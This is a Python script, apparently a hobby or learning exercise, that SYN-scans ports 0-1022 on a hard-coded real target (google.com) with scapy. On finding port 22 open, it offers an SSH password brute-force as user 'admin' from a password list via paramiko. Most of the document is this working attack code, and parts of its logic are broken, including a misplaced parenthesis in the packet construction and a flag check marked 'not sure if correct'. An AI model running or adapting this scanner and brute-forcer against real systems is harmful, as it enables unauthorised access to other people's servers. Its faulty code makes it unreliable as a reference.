import os
import sys
from scapy.layers.inet import IP, TCP, ICMP
from scapy.config import conf
from scapy.sendrecv import sr1, sr
from scapy.volatile import RandShort
import paramiko

target = 'google.com' #change target
#target = '104.87.171.127'

registered_points = range(0, 1023)
#registered_points = [22, 23, 24, 80, 443, 631] #testowo

open_ports = []

if not os.geteuid() == 0:
    sys.exit("\nOnly root can run this script\n")


def brute_force(brute_port):
    user = 'admin' # change user
    ssh_conn = paramiko.SSHClient()
    ssh_conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    passwords = []
    with open("password_list.txt") as f:
        for line in f:
            passwords.append((line.strip()))
    for password in passwords:
        try:
            ssh_conn.connect(target, port=int(brute_port), username=user, password=password, timeout=1)
            print(f'{password} is ok')
            ssh_conn.close()
        except:
            print(f'{password} failed')


def check_availability():
    res = sr1(IP(dst=target) / ICMP(), timeout=3)
    if res is None:
        return False
    else:
        return True


def scanport(port):
    try:
        temp = RandShort()
        conf.verb = 0
        p = IP(dst=target) / TCP(sport=temp, dport=port, flags='S')
        r = sr1(p, timeout=0.5)
        if r is None:
            print(f'{port} -> r is: {r}')
            return False

        syn_pkt: int = r.haslayer(TCP)

        if syn_pkt == False:
            print(f'{port} -> syn_kt is: {syn_pkt}')
            return False

        if 'x12' in str(r): # not sure if correct
            p = IP(dst=target / TCP(dport=port, flags='S'))
            tcp_res = sr(p, timeout=2)
            if tcp_res is None:
                return False
            else:
                icmp_res = sr1(IP(dst=target) / ICMP(), timeout=3)
                if icmp_res is None:
                    return False

            return True
    except:
        return False


for port in registered_points:
    result = scanport(port)
    if result == True:
        available = check_availability()
        open_ports.append(port)

print("Finished scanning")
print(f"Open ports: {open_ports}")

#open_ports.append(22) #testowo

if open_ports.__contains__(22):
    answer = input('Do you want brute force on port 22? (Y/N)')
    if answer == 'Y' or answer == 'y':
        brute_force(22)

print("Finished bruteforce")